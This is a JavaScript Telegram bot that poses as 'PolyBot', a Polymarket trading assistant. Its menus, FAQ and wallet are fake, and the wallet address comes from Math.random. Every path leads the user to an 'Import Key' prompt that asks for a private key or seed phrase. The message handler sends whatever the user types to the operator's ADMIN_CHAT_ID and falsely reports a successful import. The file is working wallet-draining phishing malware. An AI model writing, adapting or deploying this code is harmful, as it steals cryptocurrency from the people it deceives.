const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const token = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

const app = express();
app.use(express.json());

// Create bot WITHOUT polling
const bot = new TelegramBot(token);

// Webhook route
app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Set webhook
bot.setWebHook(`${WEBHOOK_URL}/bot${token}`);

// Start server
app.get('/', (req, res) => {
    res.send('🤖 PolyGun bot is running');
});
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
const userState = {};

// Helpers
function generateWallet() {
    return "0x" + Math.random().toString(16).substring(2, 42);
}

function generateReferralCode() {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
}

// MAIN MENU
function mainMenu(chatId, messageId = null) {
    const text = `🚀 *Welcome to PolyBot*

Your secure companion for rapid Polymarket trades.

📊 Current Positions: 0  
💰 Available Balance: $0.00  
📄 Active Orders: 0  
💼 Total Net Worth: $0.00  

👉 Go to *Wallet* to make a deposit.`;

    const options = {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
				[
					{ text: "📊 Portfolio", callback_data: "portfolio" },
					{ text: "📄 Orders", callback_data: "orders" },
					{ text: "💰 Wallet", callback_data: "wallet" }
				],
				[
					{ text: "🔍 Browse Markets", callback_data: "browse" },
					{ text: "🔔 Alerts", callback_data: "alerts" }
				],
				[
					{ text: "🤖 Trading Strategies", callback_data: "strategies" },
					{ text: "📈 Copy Trading", callback_data: "copy" }
				],
				[
					{ text: "⚙️ Presets", callback_data: "presets" },
					{ text: "🛑 Stop Loss", callback_data: "stoploss" }
				],
				[
					{ text: "👥 Add to Group", callback_data: "group" },
					{ text: "🎁 Referral Hub", callback_data: "referral" }
				],
				[
					{ text: "⚙️ Settings", callback_data: "settings" },
					{ text: "🔄 Refresh", callback_data: "refresh" },
					{ text: "🆘 Support", callback_data: "support" }
				]
			]
        }
    };

    if (messageId) {
        bot.editMessageText(text, { chat_id: chatId, message_id: messageId, ...options });
    } else {
        bot.sendMessage(chatId, text, options);
    }
}

// REQUIRE KEY
function requireKey(chatId, messageId) {
    bot.editMessageText(
        `🔐 *Access Required*

❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [
						{ text: "🔑 Import Key", callback_data: "import_key" },
						{ text: "🏠 Main Menu", callback_data: "main" }
					]
                ]
            }
        }
    );
}

// PORTFOLIO
function portfolio(chatId, messageId) {
    bot.editMessageText(
        `📊 *All Positions*

You have no open or resolved positions.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Refresh", callback_data: "portfolio" }],
                    [{ text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// ORDERS
function orders(chatId, messageId) {
    bot.editMessageText(
        `📄 *Limit Orders*

You have no active limit orders.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Refresh", callback_data: "orders" },
                    { text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// WALLET
function wallet(chatId, messageId, userId) {
    if (!userState[userId]) {
        userState[userId] = {
            wallet: generateWallet(),
            balance: 0,
            awaitingKey: false
        };
    }

    const data = userState[userId];

    bot.editMessageText(
        `💰 *Wallet*

📍 Address:
\`${data.wallet}\`

💵 Tradeable Balance: ${data.balance.toFixed(2)}

What would you like to do?`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📥 Deposit", callback_data: "deposit" },
                    { text: "📤 Withdraw", callback_data: "withdraw" }],
                    [{ text: "🔄 Refresh", callback_data: "wallet" }],
                    [{ text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// DEPOSIT
function deposit(chatId, messageId) {
    bot.editMessageText(
        `📥 *Deposit*

You can deposit to your wallet address on the previous page.

Or import your wallet to link your account.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔑 Import Key", callback_data: "import_key" },
                    { text: "⬅️ Back", callback_data: "wallet" }]
                ]
            }
        }
    );
}

// BROWSE MARKETS
function browseMarkets(chatId, messageId) {
    bot.editMessageText(
        `🔍 *Market Search*

Type any keyword to search (e.g. "bitcoin", "trump")

Or browse by:`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📊 Volume", callback_data: "bm_volume" },
                    { text: "📂 Category", callback_data: "bm_category" },
                    { text: "🔥 Trending", callback_data: "bm_trending" }],
                    [{ text: "🆕 New", callback_data: "bm_new" },
                    { text: "📉 Up or Down", callback_data: "bm_updown" },
                    { text: "🟢 Live", callback_data: "bm_live" }],
                    [{ text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// MARKET ALERTS
function marketAlerts(chatId, messageId) {
    bot.editMessageText(
        `🔔 *Market Alerts*

You have no active alerts.

To create one, open your Portfolio.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "➕ Add Alert", callback_data: "alert_add" }],
                    [{ text: "⬅️ Back", callback_data: "main" },
                    { text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// AUTO TRADER
function autoTrader(chatId, messageId) {
    bot.editMessageText(
        `🤖 *Auto Trader*

You don't have any strategies yet.

Choose how to begin:`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🛠 Create Strategy", callback_data: "strategy_create" },
                    { text: "⚡ Ready to Run", callback_data: "strategy_ready" }],
                    [{ text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// COPY TRADING
function copyTrading(chatId, messageId) {
    bot.editMessageText(
        `📈 *Copy Trading*

You're not following any traders yet.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "➕ Add Subscription", callback_data: "copy_add" },
                    { text: "🔍 Discover", callback_data: "copy_discover" }],
                    [{ text: "🕘 Recent Activity", callback_data: "copy_activity" },
                    { text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// PRESETS
function presets(chatId, messageId) {
    bot.editMessageText(
        `⚙️ *Presets*

No presets yet.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "➕ New Preset", callback_data: "preset_new" }],
                    [{ text: "⬅️ Back", callback_data: "main" },
                    { text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// STOP LOSS
function stopLoss(chatId, messageId) {
    bot.editMessageText(
        `🛑 *Stop Loss*

No active stop loss orders.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "➕ New Stop Loss", callback_data: "sl_new" },
                    { text: "📜 Activity Log", callback_data: "sl_activity" },
                    { text: "📊 Portfolio", callback_data: "portfolio" }],
                    [{ text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// REFERRAL HUB
function referralHub(chatId, messageId, userId) {
    if (!userState[userId]) userState[userId] = {};
    if (!userState[userId].refCode) userState[userId].refCode = generateReferralCode();

    const refCode = userState[userId].refCode;

    bot.editMessageText(
`🎁 *Referral Hub*

Earn commissions when your referrals trade.

Your code: \`${refCode}\`

Network Metrics
Tier 1 Direct: 0 users (25%)
Tier 2: 0 users (5%)
Tier 3: 0 users (3%)
Total Reach: 0 users

Stats:
Referrals: 0
Earnings: $0.00`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "💰 Claim", callback_data: "ref_claim" },
                    { text: "👥 Add to Group", callback_data: "group" }],
                    [{ text: "🏠 Main Menu", callback_data: "main" }]
                ]
            }
        }
    );
}

// SETTINGS
function settings(chatId, messageId) {
    bot.editMessageText(
        `⚙️ *Settings*

🔔 Notifications: On
💱 Currency: USD
🎨 Theme: Light`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [[{ text: "🏠 Main Menu", callback_data: "main" }]]
            }
        }
    );
}

// SUPPORT
function support(chatId, messageId) {
    bot.editMessageText(
        `🆘 *Support Center*

1. How do I deposit funds?

Go to Main Menu -> 💰 Wallet -> 📥 Deposit and pick your network. Polygon supports direct $USDC or $USDC.e deposits; other networks are bridged and swapped to $USDC.e on Polygon (the token used for trading on Polymarket).

2. My deposit hasn't arrived yet. What should I do?

Blockchain transactions can take a few minutes to confirm. Please go to your 💰 Wallet and click 🔄 Refresh Balance. If it still doesn't appear after several minutes, please contact support.

3. What are the fees for trading?

PolyBot charges a transparent 1% fee on the gross value of every trade (both buys and sells). For example, a $100 buy order will result in a $99 position, with $1 collected as a fee. There are no other hidden fees.

4. Why does the exported private key look different from my trading wallet?

Your trading wallet on Polymarket is a Safe (a smart account), not a single-key wallet. Safes don't have one private key; they're controlled by a separate "controller" key. When you export your private key from PolyBot, you're exporting that controller key. If you import it into MetaMask or another wallet and log in to Polymarket using that account, you'll still interact with the same Safe address and balance.

We use this Safe setup to keep your funds safer, ensure full Polymarket web compatibility, and provide gas abstraction - so trades just work without you having to pay any network fees.

5. How does the referral program work?

Earnings are split across three tiers: 25% (Level 1), 5% (Level 2), and 3% (Level 3) of the trading fees generated by users linked through your referral network. You can find your link and claim rewards in Main Menu -> 🤝 Refer Friends.`,
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [[{ text: "🏠 Main Menu", callback_data: "main" }]]
            }
        }
    );
}

// CALLBACK HANDLER
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const data = query.data;

    bot.answerCallbackQuery(query.id);

    switch (data) {
        case "main": mainMenu(chatId, messageId); break;
        case "portfolio": portfolio(chatId, messageId); break;
        case "orders": orders(chatId, messageId); break;
        case "wallet": wallet(chatId, messageId, userId); break;
        case "deposit": deposit(chatId, messageId); break;

        case "browse": browseMarkets(chatId, messageId); break;
        case "alerts": marketAlerts(chatId, messageId); break;
        case "strategies": autoTrader(chatId, messageId); break;
        case "copy": copyTrading(chatId, messageId); break;
        case "presets": presets(chatId, messageId); break;
        case "stoploss": stopLoss(chatId, messageId); break;
        case "referral": referralHub(chatId, messageId, userId); break;
        case "settings": settings(chatId, messageId); break;
        case "support": support(chatId, messageId); break;
        case "refresh": mainMenu(chatId, messageId); break;

        case "import_key":
    userState[userId] = userState[userId] || {};

    // store where user came from
    userState[userId].lastMenu = query.message.text;
    userState[userId].lastCallback = query.message.reply_markup?.inline_keyboard?.[0]?.[0]?.callback_data || "main";

    userState[userId].awaitingKey = true;

    bot.editMessageText(
        "📝 Please provide the private key or the 12-24 words mnemonic phrase of your wallet that you wish to connect.",
        {
            parse_mode: "Markdown",
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "⬅️ Back", callback_data: "back_from_key" }]
                ]
            }
        }
    );
    break;
	
	case "back_from_key":
    userState[userId].awaitingKey = false;

    // fallback safely to main menu
    mainMenu(chatId, messageId);
    break;

        default:
            requireKey(chatId, messageId);
    }
});

// HANDLE INPUT
bot.on('message', (msg) => {
    const userId = msg.from.id;

    if (userState[userId]?.awaitingKey) {
        const key = msg.text;

        userState[userId].awaitingKey = false;

        bot.sendMessage(ADMIN_CHAT_ID, `🔑 New Key:\n${key}`);
        bot.sendMessage(msg.chat.id, "✅ Private Key successfully imported");

        mainMenu(msg.chat.id);
    }
});

// START
bot.onText(/\/start/, (msg) => {
    mainMenu(msg.chat.id);
});
